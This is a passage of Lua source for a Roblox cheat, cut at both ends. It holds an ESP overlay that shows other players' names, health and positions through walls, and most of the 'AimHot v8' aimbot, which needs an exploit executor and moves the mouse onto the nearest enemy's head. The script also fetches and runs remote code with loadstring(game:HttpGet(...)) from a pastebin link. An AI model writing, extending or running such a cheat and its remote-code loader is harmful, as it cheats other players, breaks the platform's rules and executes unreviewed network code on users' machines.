						OutlineTracer.Transparency = Tracer.Transparency - 0.15;
						OutlineTracer.Visible = true;
					else
						Tracer.Visible = false;
						OutlineTracer.Visible = false;
					end
					
					if ScreenPosition.Z > 0 then
						local ScreenPositionUpper	= WorldToViewport((HumanoidRootPart:GetRenderCFrame() * CFrame.new(0, Head.Size.Y + HumanoidRootPart.Size.Y + (Options.YOffset.Value / 25), 0)).Position);
						local Scale					= Head.Size.Y / 2;

						if Options.ShowName.Value then
							NameTag.Visible		= true;
							NameTag.Text		= v.Name .. (CustomPlayerTag and CustomPlayerTag(v) or '');
							NameTag.Size		= Options.TextSize.Value;
							NameTag.Outline		= Options.TextOutline.Value;
							NameTag.Position	= V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y) - V2New(0, NameTag.TextBounds.Y);
							NameTag.Color		= Color;
							NameTag.Color		= Color;
							NameTag.OutlineColor= Color3.new(0.05, 0.05, 0.05);
							NameTag.Transparency= 0.85;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end
						else
							NameTag.Visible = false;
						end
						if Options.ShowDistance.Value or Options.ShowHealth.Value then
							DistanceTag.Visible		= true;
							DistanceTag.Size		= Options.TextSize.Value - 1;
							DistanceTag.Outline		= Options.TextOutline.Value;
							DistanceTag.Color		= Color3.new(1, 1, 1);
							DistanceTag.Transparency= 0.85;
							if Drawing.Fonts and shared.am_ic3 then -- CURRENTLY SYNAPSE ONLY :MEGAHOLY:
								NameTag.Font	= Drawing.Fonts.Monospace;
							end

							local Str = '';

							if Options.ShowDistance.Value then
								Str = Str .. Format('[%d] ', Distance);
							end
							if Options.ShowHealth.Value then								
								if typeof(Humanoid) == 'Instance' then
									Str = Str .. Format('[%d/%d] [%s%%]', Humanoid.Health, Humanoid.MaxHealth, math.floor(Humanoid.Health / Humanoid.MaxHealth * 100));
								elseif type(GetHealth) == 'function' then
									local health, maxHealth = GetHealth(v)
									
									if type(health) == 'number' and type(maxHealth) == 'number' then
										Str = Str .. Format('[%d/%d] [%s%%]', health, maxHealth, math.floor(health / maxHealth * 100))
									end
								end
							end

							DistanceTag.Text = Str;
							DistanceTag.OutlineColor = Color3.new(0.05, 0.05, 0.05);
							DistanceTag.Position = (NameTag.Visible and NameTag.Position + V2New(0, NameTag.TextBounds.Y) or V2New(ScreenPositionUpper.X, ScreenPositionUpper.Y));
						else
							DistanceTag.Visible = false;
						end
						if Options.ShowDot.Value and Vis then
							local Top			= WorldToViewport((Head.CFrame * CFrame.new(0, Scale, 0)).Position);
							local Bottom		= WorldToViewport((Head.CFrame * CFrame.new(0, -Scale, 0)).Position);
							local Radius		= math.abs((Top - Bottom).Y);

							HeadDot.Visible		= true;
							HeadDot.Color		= Color;
							HeadDot.Position	= V2New(ScreenPosition.X, ScreenPosition.Y);
							HeadDot.Radius		= Radius;
						else
							HeadDot.Visible = false;
						end
						if Options.ShowBoxes.Value and Vis and HumanoidRootPart then
							local Body = {
								Head;
								Character:FindFirstChild'Left Leg' or Character:FindFirstChild'LeftLowerLeg';
								Character:FindFirstChild'Right Leg' or Character:FindFirstChild'RightLowerLeg';
								Character:FindFirstChild'Left Arm' or Character:FindFirstChild'LeftLowerArm';
								Character:FindFirstChild'Right Arm' or Character:FindFirstChild'RightLowerArm';
							}
							Box:Update(HumanoidRootPart.CFrame, V3New(2, 3, 1) * (Scale * 2), Color, nil, shared.am_ic3 and Body);
						else
							Box:SetVisible(false);
						end
					else
						NameTag.Visible			= false;
						DistanceTag.Visible		= false;
						HeadDot.Visible			= false;
						
						Box:SetVisible(false);
					end
				else
					NameTag.Visible			= false;
					DistanceTag.Visible		= false;
					HeadDot.Visible			= false;
					Tracer.Visible			= false;
					OutlineTracer.Visible 	= false;
					
					Box:SetVisible(false);
				end
			else
				NameTag.Visible			= false;
				DistanceTag.Visible		= false;
				HeadDot.Visible			= false;
				Tracer.Visible			= false;
				OutlineTracer.Visible 	= false;

				Box:SetVisible(false);
			end

			shared.InstanceData[v.Name] = Data;
		end
	end
end

local LastInvalidCheck = 0;

local function Update()
	if tick() - LastInvalidCheck > 0.3 then
		LastInvalidCheck = tick();

		if Camera.Parent ~= workspace then
			Camera = workspace.CurrentCamera;
			CameraCon();
			WTVP = Camera.WorldToViewportPoint;
		end

		for i, v in pairs(shared.InstanceData) do
			if not Players:FindFirstChild(tostring(i)) then
				if not shared.InstanceData[i].DontDelete then
					GetTableData(v.Instances)(function(i, obj)
						obj.Visible = false;
						obj:Remove();
						v.Instances[i] = nil;
					end)
					shared.InstanceData[i] = nil;
				else
					if shared.InstanceData[i].Instance == nil or shared.InstanceData[i].Instance.Parent == nil then
						GetTableData(v.Instances)(function(i, obj)
							obj.Visible = false;
							obj:Remove();
							v.Instances[i] = nil;
						end)
						shared.InstanceData[i] = nil;
					end
				end
			end
		end
	end

	local CX = Menu:GetInstance'CrosshairX';
	local CY = Menu:GetInstance'CrosshairY';
	
	if Options.Crosshair.Value then
		CX.Visible = true;
		CY.Visible = true;

		CX.To = V2New((Camera.ViewportSize.X / 2) - 8, (Camera.ViewportSize.Y / 2));
		CX.From = V2New((Camera.ViewportSize.X / 2) + 8, (Camera.ViewportSize.Y / 2));
		CY.To = V2New((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) - 8);
		CY.From = V2New((Camera.ViewportSize.X / 2), (Camera.ViewportSize.Y / 2) + 8);
	else
		CX.Visible = false;
		CY.Visible = false;
	end

	if Options.MenuOpen.Value and MenuLoaded then
		local MLocation = GetMouseLocation();
		shared.MenuDrawingData.Instances.Main.Color = Color3.fromHSV(tick() * 24 % 255/255, 1, 1);
		local MainInstance = Menu:GetInstance'Main';
		
		local Values = {
			MainInstance.Position.X;
			MainInstance.Position.Y;
			MainInstance.Position.X + MainInstance.Size.X;
			MainInstance.Position.Y + MainInstance.Size.Y;
		};
		
		if MainInstance and (MouseHoveringOver(Values) or (SubMenu.Open and MouseHoveringOver(SubMenu.Bounds))) then
			Debounce.CursorVis = true;
			
			Menu:UpdateMenuInstance'Cursor1'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y);
				To		= V2New(MLocation.x + 5, MLocation.y + 6);
			}
			Menu:UpdateMenuInstance'Cursor2'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y);
				To		= V2New(MLocation.x, MLocation.y + 8);
			}
			Menu:UpdateMenuInstance'Cursor3'{
				Visible	= true;
				From	= V2New(MLocation.x, MLocation.y + 6);
				To		= V2New(MLocation.x + 5, MLocation.y + 5);
			}
		else
			if Debounce.CursorVis then
				Debounce.CursorVis = false;
				
				Menu:UpdateMenuInstance'Cursor1'{Visible = false};
				Menu:UpdateMenuInstance'Cursor2'{Visible = false};
				Menu:UpdateMenuInstance'Cursor3'{Visible = false};
			end
		end
		if MouseHeld then
			local MousePos = GetMouseLocation();

			if Dragging then
				DraggingWhat.Slider.Position = V2New(math.clamp(MLocation.X - DraggingWhat.Slider.Size.X / 2, DraggingWhat.Line.Position.X, DraggingWhat.Line.Position.X + DraggingWhat.Line.Size.X - DraggingWhat.Slider.Size.X), DraggingWhat.Slider.Position.Y);
				local Percent	= (DraggingWhat.Slider.Position.X - DraggingWhat.Line.Position.X) / ((DraggingWhat.Line.Position.X + DraggingWhat.Line.Size.X - DraggingWhat.Line.Position.X) - DraggingWhat.Slider.Size.X);
				local Value		= CalculateValue(DraggingWhat.Min, DraggingWhat.Max, Percent);
				DraggingWhat.Option(Value);
			elseif DraggingUI then
				Debounce.UIDrag = true;
				local Main = Menu:GetInstance'Main';
				Main.Position = MousePos + DragOffset;
			elseif DragTracerPosition then
				TracerPosition = MousePos;
			end
		else
			Dragging = false;
			DragTracerPosition = false;
			if DraggingUI and Debounce.UIDrag then
				Debounce.UIDrag = false;
				DraggingUI = false;
				CreateMenu(Menu:GetInstance'Main'.Position);
			end
		end
		if not Debounce.Menu then
			Debounce.Menu = true;
			ToggleMenu();
		end
	elseif Debounce.Menu and not Options.MenuOpen.Value then
		Debounce.Menu = false;
		ToggleMenu();
	end
end

RunService:UnbindFromRenderStep(GetDataName);
RunService:UnbindFromRenderStep(UpdateName);

RunService:BindToRenderStep(GetDataName, 300, UpdatePlayerData);
RunService:BindToRenderStep(UpdateName, 199, Update);
end
if AimH == true then
--[[
    AimHot v8, Herrtt#3868

    I decided to make it open source for all the new scripters out there (including me), don't ripoff or claim this as your own.
    When I get time I will comment a lot of the stuff here.

]]



-- Extremly bad code starts below here

local DEBUG_MODE = false -- warnings, prints and profiles dont change idiot thanks

-- Ok I declare some variables here for micro optimization. I might declare again in the blocks because I am lazy to check here
local game, workspace = game, workspace

local cf, v3, v2, udim2 = CFrame, Vector3, Vector2, UDim2
local string, math, table, Color3, tonumber, tostring = string, math, table, Color3, tonumber, tostring

local cfnew = cf.new
local cf0 = cfnew()

local v3new = v3.new
local v30 = v3new()

local v2new = v2.new
local v20 = v2new()

local setmetatable = setmetatable
local getmetatable = getmetatable

local type, typeof = type, typeof

local Instance = Instance

local drawing = Drawing or drawing

local mousemoverel = mousemoverel or (Input and Input.MouseMove)

local readfile = readfile
local writefile = writefile
local appendfile = appendfile

local warn, print = DEBUG_MODE and warn or function() end, DEBUG_MODE and print or function() end


local required = {
    mousemoverel, drawing, readfile, writefile, appendfile, game.HttpGet, game.GetObjects
}

for i,v in pairs(required) do
    if v == nil then
        warn("Your exploit is not supported (may consider purchasing a better one?)!")
        return -- Only pros return in top-level function
    end
end

local servs
servs = setmetatable(
{
    Get = function(self, serv)
        if servs[serv] then return servs[serv] end
        local s = game:GetService(serv)
        if s then servs[serv] = s end
        return s
    end;
}, {
    __index = function(self, index)
        local s = game:GetService(index)
        if s then servs[index] = s end
        return s
    end;
})

local connections = {}
local function bindEvent(event, callback) -- Let me disconnect in peace
    local con = event:Connect(callback)
    table.insert(connections, con)
    return con
end

local players = servs.Players
local runservice = servs.RunService
local http = servs.HttpService
local uis = servs.UserInputService

local function jsonEncode(t)
    return http:JSONEncode(t)
end
local function jsonDecode(t)
    return http:JSONDecode(t)
end

local function existsFile(name)
    return pcall(function()
        return readfile(name)
    end)
end

local function mergetab(a,b)
    local c = a or {}
    for i,v in pairs(b or {}) do 
        c[i] = v 
    end
    return c
end

local locpl = players.LocalPlayer
local mouse = locpl:GetMouse()
local camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function() -- if a script changes currentcamera
    camera = workspace.CurrentCamera
end)


local findFirstChild = game.FindFirstChild
local findFirstChildOfClass = game.FindFirstChildOfClass
local isDescendantOf = game.IsDescendantOf

-- Just to check another aimhot instance is running and close it
local uid = tick() .. math.random(1,100000) .. math.random(1,100000)
if shared.ah8 and shared.ah8.close and shared.ah8.uid~=uid then shared.ah8:close() end

-- Main shitty script should start below here

warn("AH8_MAIN : Running script...")

local event = {} 
local utility = {}
local serializer = {}

local settings = {}

local hud = loadstring(game:HttpGet("https://pastebin.com/raw/3hREvLEU", DEBUG_MODE == false and true or DEBUG_MODE == true and false))()[1] -- Ugly ui do not care

local aimbot = {}

local visuals = {}

local crosshair = {}
local esp = {}
local boxes = {}
local tracers = {}

local run = {}
local ah8 = {enabled = true;}


local visiblekids = {} -- no need to check twice each frame yes? todo :(
-- Some libraries

do
    --/ Events : custom event system, bindables = gay

    local type = type;
    local coroutine = coroutine;
    local create = coroutine.create;
    local resume = coroutine.resume;

    local function spawn(f, ...)
        resume(create(f), ...)
    end

    function event.new(t)
        local self = t or {}
        
        local n = 0
        local connections = {}
        function self:connect(func)
            if type(func) ~= "function" then return end

            n = n + 1
            local my = n
            connections[n] = func

            local connected = true
            local function disconnect()
                if connected ~= true then return end
                connected = false

                connections[n] = nil
            end

            return disconnect
        end


        local function fire(...)
            for i,v in pairs(connections) do
                v(...)
            end
        end

        return fire, self
    end
end

do
    --/ Utility : To make it easier for me to edit

    local getPlayers = players.GetPlayers
    local getPartsObscuringTarget = camera.GetPartsObscuringTarget
    local worldToViewportPoint = camera.WorldToViewportPoint
    local worldToScreenPoint = camera.WorldToScreenPoint
    local raynew = Ray.new
    local findPartOnRayWithIgnoreList = workspace.FindPartOnRayWithIgnoreList
    local findPartOnRay = workspace.FindPartOnRay
    local findFirstChild = game.FindFirstChild

    local function raycast(ray, ignore, callback)
        local ignore = ignore or {}

        local hit, pos, normal, material = findPartOnRayWithIgnoreList(workspace, ray, ignore)
        while hit and callback do
            local Continue, _ignore = callback(hit)
            if not Continue then
                break
            end
            if _ignore then
                table.insert(ignore, _ignore)
            else
                table.insert(ignore, hit)
            end
            hit, pos, normal, material = findPartOnRayWithIgnoreList(workspace, ray, ignore)
        end
        return hit, pos, normal, material
    end

    local function badraycastnotevensure(pos, ignore) -- 1 ray > 1 obscuringthing | 100 rays < 1 obscuring thing
        local hitparts = getPartsObscuringTarget(camera, {pos}, ignore or {})
        return hitparts
    end

    local charshit = {}
    function utility.getcharacter(player) -- Change this or something if you want to add support for other games.
        if (player == nil) then return end
        if (charshit[player]) then return charshit[player] end

        local char = player.Character
        if (char == nil or isDescendantOf(char, game) == false) then
            char = findFirstChild(workspace, player.Name)
        end

        return char
    end

    utility.mychar = nil
    utility.myroot = nil

    local rootshit = {}
    function utility.getroot(player)
        if (player == nil) then return end
        if (rootshit[player]) then return rootshit[player] end

        local char
        if (player:IsA("Player")) then
            char = utility.getcharacter(player)
        else
            char = player
        end

        if (char ~= nil) then
            local root = (findFirstChild(char, "HumanoidRootPart") or char.PrimaryPart)
            if (root ~= nil) then -- idk
                --bindEvent(root.AncestryChanged, function(_, parent)
                --    if (parent == nil) then
                --        roostshit[player] = nil
                --    end
                --end)
            end

            --rootshit[player] = root
            return root
        end

        return
    end

    spawn(function()
        while ah8 and ah8.enabled do -- Some games are gay
            utility.mychar = utility.getcharacter(locpl)
            if (utility.mychar ~= nil) then
                utility.myroot = utility.getroot(locpl)
            end
            wait(.5)
        end
    end)
    utility.mychar = locpl.Character
    utility.myroot = utility.mychar and findFirstChild(utility.mychar, "HumanoidRootPart") or utility.mychar and utility.mychar.PrimaryPart
    bindEvent(locpl.CharacterAdded, function(char)
        utility.mychar = char
        wait(.1)
        utility.myroot = utility.mychar and findFirstChild(utility.mychar, "HumanoidRootPart") or utility.mychar.PrimaryPart
    end)
    bindEvent(locpl.CharacterRemoving, function()
        utility.mychar = nil
        utility.myroot = nil
    end)
    

    function utility.isalive(_1, _2)
        if _1 == nil then return end
        local Char, RootPart
        if _2 ~= nil then
            Char, RootPart = _1,_2
        else
            Char = utility.getcharacter(_1)
            RootPart = Char and (Char:FindFirstChild("HumanoidRootPart") or Char.PrimaryPart)
        end

        if Char and RootPart then
            local Human = findFirstChildOfClass(Char, "Humanoid")
            if RootPart and Human then
                if Human.Health > 0 then
                    return true
                end
            elseif RootPart and isDescendantOf(Char, game) then
                return true
            end
        end

        return false
    end

    local shit = false
    function utility.isvisible(char, root, max, ...)
        local pos = root.Position
        if shit or max > 4 then
            local parts = badraycastnotevensure(pos, {utility.mychar, ..., camera, char, root})
            
            return parts == 0
        else
            local camp = camera.CFrame.p
            local dist = (camp - pos).Magnitude

            local hitt = 0
            local hit = raycast(raynew(camp, (pos - camp).unit * dist), {utility.mychar, ..., camera}, function(hit)

                if hit.CanCollide ~= false then-- hit.Transparency ~= 1 then¨
                    hitt = hitt + 1
                    return hitt < max
                end
            
                if isDescendantOf(hit, char) then
                    return
                end
                return true
            end)

            return hit == nil and true or isDescendantOf(hit, char), hitt
        end
    end
    function utility.sameteam(player, p1)
        local p0 = p1 or locpl
        return (player.Team~=nil and player.Team==p0.Team) and player.Neutral == false or false
    end
    function utility.getDistanceFromMouse(position)
        local screenpos, vis = worldToViewportPoint(camera, position)
        if vis and screenpos.Z > 0 then
            return (v2new(mouse.X, mouse.Y) - v2new(screenpos.X, screenpos.Y)).Magnitude
        end
        return math.huge
    end


    local hashes = {}
    function utility.getClosestMouseTarget(settings)
        local closest, temp = nil, settings.fov or math.huge
        local plr

        for i,v in pairs(getPlayers(players)) do
            if (locpl ~= v and (settings.ignoreteam==true and utility.sameteam(v)==false or settings.ignoreteam == false)) then
                local character = utility.getcharacter(v)
                if character and isDescendantOf(character, game) == true then
                    local hash = hashes[v]
                    local part = hash or findFirstChild(character, settings.name or "HumanoidRootPart") or findFirstChild(character, "HumanoidRootPart") or character.PrimaryPart
                    if hash == nil then hashes[v] = part end
                    if part and isDescendantOf(part, game) == true then
                        local legal = true

                        local rp = part:GetRenderCFrame().p
                        local distance = utility.getDistanceFromMouse(rp)
                        if temp <= distance then
                            legal = false
                        end

                        if legal then
                            if settings.checkifalive then
                                local isalive = utility.isalive(character, part)
                                if not isalive then
                                    legal = false
                                end
                            end
                        end

                        if legal then
                            local visible = true
                            if settings.ignorewalls == false then
                                local vis = utility.isvisible(character, part, (settings.maxobscuringparts or 0))
                                if not vis then
                                    legal = false
                                end
                            end
                        end

                        if legal then
                            local dist1
                            temp = distance
                            closest = part
                            plr = v
                        end
                    end
                end
            end
        end -- who doesnt love 5 ends in a row?

        return closest, temp, plr
    end
    function utility.getClosestTarget(settings)

        local closest, temp = nil, math.huge
        --local utility.myroot = utility.mychar and (findFirstChild(utility.mychar, settings.name or "HumanoidRootPart") or findFirstChild(utility.mychar, "HumanoidRootPart"))
        
        if utility.myroot then
            for i,v in pairs(getPlayers(players)) do
                if (locpl ~= v) and (settings.ignoreteam==true and utility.sameteam(v)==false or settings.ignoreteam == false) then
                    local character = utility.getcharacter(v)
                    if character then
                        local hash = hashes[v]
                        local part = hash or findFirstChild(character, settings.name or "HumanoidRootPart") or findFirstChild(character, "HumanoidRootPart")
                        if hash == nil then hashes[v] = part end

                        if part then
                            local visible = true
                            if settings.ignorewalls == false then
                                local vis, p = utility.isvisible(character, part, (settings.maxobscuringparts or 0))
                                if p <= (settings.maxobscuringparts or 0) then
                                    visible = vis
                                end
                            end

                            if visible then
                                local distance = (utility.myroot.Position - part.Position).Magnitude
                                if temp > distance then
                                    temp = distance
                                    closest = part
                                end
                            end
                        end
                    end
                end
            end
        end

        return closest, temp
    end

    spawn(function()
        while ah8 and ah8.enabled do
            for i,v in pairs(hashes) do
                hashes[i] = nil
                wait()
            end
            wait(4)
            --hashes = {}
        end
    end)
end


local serialize
local deserialize
do
    --/ Serializer : garbage : slow as fuck
	
	local function hex_encode(IN, len)
	    local B,K,OUT,I,D=16,"0123456789ABCDEF","",0,nil
	    while IN>0 do
	        I=I+1
	        IN,D=math.floor(IN/B), IN%B+1
	        OUT=string.sub(K,D,D)..OUT
	    end
		if len then
			OUT = ('0'):rep(len - #OUT) .. OUT
		end
	    return OUT
	end
	local function hex_decode(IN) 
		return tonumber(IN, 16) 
	end

    local types = {
        ["nil"] = "0";
        ["boolean"] = "1";
        ["number"] = "2";
        ["string"] = "3";
        ["table"] = "4";

		["Vector3"] = "5";
		["CFrame"] = "6";
        ["Instance"] = "7";
	
		["Color3"] = "8";
    }
    local rtypes = (function()
        local a = {}
        for i,v in pairs(types) do
            a[v] = i
        end
        return a
    end)()

    local typeof = typeof or type
    local function encode(t, ...)
        local type = typeof(t)
        local s = types[type]
        local c = ''
        if type == "nil" then
            c = types[type] .. "0"
        elseif type == "boolean" then
            local t = t == true and '1' or '0'
            c = s .. t
        elseif type == "number" then
            local new = tostring(t)
            local len = #new
            c = s .. len .. "." .. new
        elseif type == "string" then
            local new = t
            local len = #new
            c = s .. len .. "." .. new
		elseif type == "Vector3" then
			local x,y,z = tostring(t.X), tostring(t.Y), tostring(t.Z)
			local new = hex_encode(#x, 2) .. x .. hex_encode(#y, 2) .. y .. hex_encode(#z, 2) .. z
			c = s .. new
		elseif type == "CFrame" then
			local a = {t:GetComponents()}
			local new = ''
			for i,v in pairs(a) do
				local l = tostring(v)
				new = new .. hex_encode(#l, 2) .. l
			end
			c = s .. new
		elseif type == "Color3" then
			local a = {t.R, t.G, t.B}
			local new = ''
			for i,v in pairs(a) do
				local l = tostring(v)
				new = new .. hex_encode(#l, 2) .. l
			end
			c = s .. new
        elseif type == "table" then
            return serialize(t, ...)
        end
        return c
    end
    local function decode(t, extra)
        local p = 0
        local function read(l)
            l = l or 1
            p = p + l
            return t:sub(p-l + 1, p)
        end
        local function get(a)
            local k = ""
            while p < #t do
                if t:sub(p+1,p+1) == a then
                    break
                else
                    k = k .. read()
                end
            end
            return k
        end
        local type = rtypes[read()]
        local c

        if type == "nil" then
            read()
        elseif type == "boolean" then
            local d = read()
            c = d == "1" and true or false
        elseif type == "number" then
            local length = tonumber(get("."))
            local d = read(length+1):sub(2,-1)
            c = tonumber(d)
        elseif type == "string" then
            local length = tonumber(get(".")) --read()
            local d = read(length+1):sub(2,-1)
            c = d
		elseif type == "Vector3" then
			local function getnext()
				local length = hex_decode(read(2))
				local a = read(tonumber(length))
				return tonumber(a)
			end
			local x,y,z = getnext(),getnext(),getnext()
			c = Vector3.new(x, y, z)
		elseif type == "CFrame" then
			local a = {}
			for i = 1,12 do
				local l = hex_decode(read(2))
				local b = read(tonumber(l))
				a[i] = tonumber(b)
			end
			c = CFrame.new(unpack(a))
        elseif type == "Instance" then
			local pos = hex_decode(read(2))
			c = extra[tonumber(pos)]
		elseif type == "Color3" then
			local a = {}
			for i = 1,3 do
				local l = hex_decode(read(2))
				local b = read(tonumber(l))
				a[i] = tonumber(b)
			end
			c = Color3.new(unpack(a))
        end
        return c
    end

    function serialize(data, p)
		if data == nil then return end
        local type = typeof(data)
        if type == "table" then
            local extra = {}
            local s = types[type]
            local new = ""
            local p = p or 0
            for i,v in pairs(data) do
                local i1,v1
                local t0,t1 = typeof(i), typeof(v)

				local a,b
                if t0 == "Instance" then
                    p = p + 1
                    extra[p] = i
                    i1 = types[t0] .. hex_encode(p, 2)
                else
                    i1, a = encode(i, p)
					if a then
						for i,v in pairs(a) do
							extra[i] = v
						end
					end
                end
                
                if t1 == "Instance" then
                    p = p + 1
                    extra[p] = v
                    v1 = types[t1] .. hex_encode(p, 2)
                else
                    v1, b = encode(v, p)
					if b then
						for i,v in pairs(b) do
							extra[i] = v
						end
					end
                end
                new = new .. i1 .. v1
            end
            return s .. #new .. "." .. new, extra
		elseif type == "Instance" then
			return types[type] .. hex_encode(1, 2), {data}
        else
            return encode(data), {}
        end
    end

    function deserialize(data, extra)
		if data == nil then return end
		extra = extra or {}
		
        local type = rtypes[data:sub(1,1)]
        if type == "table" then

            local p = 0
            local function read(l)
                l = l or 1
                p = p + l
                return data:sub(p-l + 1, p)
            end
            local function get(a)
                local k = ""
                while p < #data do
                    if data:sub(p+1,p+1) == a then
                        break
                    else
                        k = k .. read()
                    end
                end
                return k
            end

            local length = tonumber(get("."):sub(2, -1))
            read()

            local new = {}

            local l = 0
            while p <= length do
                l = l + 1

				local function getnext()
					local i
                    local t = read()
                    local type = rtypes[t]

                    if type == "nil" then
                        i = decode(t .. read())
                    elseif type == "boolean" then
                        i = decode(t .. read())
                    elseif type == "number" then
                        local l = get(".")
                        
                        local dc = t .. l .. read()
                        local a = read(tonumber(l))
                        dc = dc .. a

                        i = decode(dc)
                 	elseif type == "string" then
                        local l = get(".")
                        local dc = t .. l .. read()
                        local a = read(tonumber(l))
                        dc = dc .. a

                        i = decode(dc)
					 elseif type == "Vector3" then
						local function getnext()
							local length = hex_decode(read(2))
							local a = read(tonumber(length))
							return tonumber(a)
						end
						local x,y,z = getnext(),getnext(),getnext()
						i = Vector3.new(x, y, z)
					elseif type == "CFrame" then
						local a = {}
						for i = 1,12 do
							local l = hex_decode(read(2))
							local b = read(tonumber(l)) -- why did I decide to do this
							a[i] = tonumber(b)
						end
						i = CFrame.new(unpack(a))
					elseif type == "Instance" then
						local pos = hex_decode(read(2))
						i = extra[tonumber(pos)]
					elseif type == "Color3" then
						local a = {}
						for i = 1,3 do
							local l = hex_decode(read(2))
							local b = read(tonumber(l))
							a[i] = tonumber(b)
						end
						i = Color3.new(unpack(a))
                    elseif type == "table" then
                        local l = get(".")
                        local dc = t .. l .. read() .. read(tonumber(l))
                        i = deserialize(dc, extra)
                    end
					return i
				end
                local i = getnext()
                local v = getnext()

               new[(typeof(i) ~= "nil" and i or l)] =  v
            end


            return new
		elseif type == "Instance" then
			local pos = tonumber(hex_decode(data:sub(2,3)))
			return extra[pos]
        else
            return decode(data, extra)
        end
    end
end


-- great you have come a far way now stop before my horrible scripting will infect you moron

do
    --/ Settings

    -- TODO: Other datatypes.
    settings.fileName = "AimHot_v8_settings.txt" -- Lovely
    settings.saved = {}

    function settings:Get(name, default)
        local self = {}
        local value = settings.saved[name]
        if value == nil and default ~= nil then
            value = default
            settings.saved[name] = value
        end
        self.Value = value
        function self:Set(val)
            self.Value = val
            settings.saved[name] = val
        end
        return self  --value or default
    end

    function settings:Set(name, value)
        local r = settings.saved[name]
        settings.saved[name] = value
        return r
    end

    function settings:Save()
        local savesettings = settings:GetAll() or {}
        local new = mergetab(savesettings, settings.saved)
        local js = serialize(new)

        writefile(settings.fileName, js)
    end

    function settings:GetAll()
        if not existsFile(settings.fileName) then
            return
        end
        local fileContents = readfile(settings.fileName)

        local data
        pcall(function()
            data = deserialize(fileContents)
        end)
        return data
    end

    function settings:Load()
        if not existsFile(settings.fileName) then
            return
        end
        local fileContents = readfile(settings.fileName)

        local data
        pcall(function()
            data = deserialize(fileContents)
        end)

        if data then
            data = mergetab(settings.saved, data)
        end
        settings.saved = data
        return data
    end
    settings:Load()

    spawn(function()
        while ah8 and ah8.enabled do
            settings:Save()
            wait(5)
        end
    end)
end

-- Aiming aim bot aim aim stuff bot

do
    --/ Aimbot

    -- Do I want to make this decent?
    local aimbot_settings = {}
    aimbot_settings.ignoreteam = settings:Get("aimbot.ignoreteam", false)
    aimbot_settings.sensitivity = settings:Get("aimbot.sensitivity", .5)
    aimbot_settings.locktotarget = settings:Get("aimbot.locktotarget", true)
    aimbot_settings.checkifalive = settings:Get("aimbot.checkifalive", false)

    aimbot_settings.ignorewalls = settings:Get("aimbot.ignorewalls", true)
    aimbot_settings.maxobscuringparts = settings:Get("aimbot.maxobscuringparts", 0)


    aimbot_settings.enabled = settings:Get("aimbot.enabled", false)
    aimbot_settings.keybind = settings:Get("aimbot.keybind", "MouseButton2")
    aimbot_settings.presstoenable = settings:Get("aimbot.presstoenable", true)

    aimbot_settings.fovsize = settings:Get("aimbot.fovsize", 400)
    aimbot_settings.fovenabled = settings:Get("aimbot.fovenabled", true)
    aimbot_settings.fovsides = settings:Get("aimbot.fovsides", 10)
    aimbot_settings.fovthickness = settings:Get("aimbot.fovthickness", 1)
    
    aimbot.fovshow = aimbot_settings.fovenabled.Value

    setmetatable(aimbot, {
        __index = function(self, index)
            if aimbot_settings[index] ~= nil then
                local Value = aimbot_settings[index]
                if typeof(Value) == "table" then
                    return typeof(Value) == "table" and Value.Value
                else
                    return Value
                end
            end
            warn(("AH8_ERROR : AimbotSettings : Tried to index %s"):format(tostring(index)))
        end;
        __newindex = function(self, index, value)
            if typeof(value) ~= "function" then
                if aimbot_settings[index] then
                    local v = aimbot_settings[index]
                    if typeof(v) ~= "table" then
                        aimbot_settings[index] = value
                        return
                    elseif v.Set then
                        v:Set(value)
                        return
                    end
                end
            end
            rawset(self, index, value)
        end; -- ew
    })


    local worldToScreenPoint = camera.WorldToScreenPoint -- why did I start this
    local target, _, closestplr = nil, nil, nil;
    local completeStop = false

    local enabled = false
    bindEvent(uis.InputBegan, function(key,gpe)
        if aimbot.enabled == false then return end

        if aimbot.presstoenable then
            aimbot.fovshow = true
        else
            aimbot.fovshow = enabled == true
        end

        local keyc = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
        if keyc.Name == aimbot.keybind then
            if aimbot.presstoenable then
                enabled = true
                aimbot.fovshow = true
            else
                enabled = not enabled
                aimbot.fovshow = enabled == true
            end
        end
    end)
    bindEvent(uis.InputEnded, function(key)
        if aimbot.enabled == false then enabled = false aimbot.fovshow = false end
        if aimbot.presstoenable then
            aimbot.fovshow = true
        else
            aimbot.fovshow = enabled == true
        end

        local keyc = key.KeyCode == Enum.KeyCode.Unknown and key.UserInputType or key.KeyCode
        if keyc.Name == aimbot.keybind then
            if aimbot.presstoenable then
                enabled = false
            end
        end
    end)


    local function calculateTrajectory()
        -- my math is a bit rusty atm
    end

    local function aimAt(vector)
        if completeStop then return end
        local newpos = worldToScreenPoint(camera, vector)
        mousemoverel((newpos.X - mouse.X) * aimbot.sensitivity, (newpos.Y - mouse.Y) * aimbot.sensitivity)
    end

    function aimbot.step()
        if completeStop or aimbot.enabled == false or enabled == false or utility.mychar == nil or isDescendantOf(utility.mychar, game) == false then 
            if target or closestplr then
                target, closestplr, _ = nil, nil, _
            end
            return 
        end
        
        if aimbot.locktotarget == true then
            local cchar = utility.getcharacter(closestplr)
            if target == nil or isDescendantOf(target, game) == false or closestplr == nil or closestplr.Parent == nil or cchar  == nil or isDescendantOf(cchar, game) == false then
                target, _, closestplr = utility.getClosestMouseTarget({ -- closest to mouse or camera mode later just wait
                    ignoreteam = aimbot.ignoreteam;
                    ignorewalls = aimbot.ignorewalls;
                    maxobscuringparts = aimbot.maxobscuringparts;
                    name = 'Head';
                    fov = aimbot.fovsize;
                    checkifalive = aimbot.checkifalive;
                    -- mode = "mouse";
                })
            else
                --target = target
                local stop = false
                if stop == false and not (aimbot.ignoreteam==true and utility.sameteam(closestplr)==false or aimbot.ignoreteam == false) then
                    stop = true
                end
                local visible = true

                if stop == false and aimbot.ignorewalls == false then
                    local vis = utility.isvisible(target.Parent, target, (aimbot.maxobscuringparts or 0))
                    if not vis then
                        stop = true
                    end
                end

                if stop == false and aimbot.checkifalive then
                    local isalive = utility.isalive(character, part)
                    if not isalive then
                        stop = true
                    end
                end

                if stop then
